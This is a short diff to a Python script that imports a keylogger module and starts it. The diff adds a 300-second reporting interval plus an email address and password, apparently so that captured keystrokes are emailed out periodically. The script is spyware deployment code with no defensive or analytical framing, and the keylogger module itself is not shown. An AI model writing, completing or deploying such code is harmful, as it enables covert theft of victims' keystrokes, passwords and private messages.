@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import key_logger
 
-my_keylogger = key_logger.Keylogger()
+# enter number of seconds between reports
+my_keylogger = key_logger.Keylogger(300, "johnroge@outlook.com", "somepassword")
 my_keylogger.start()
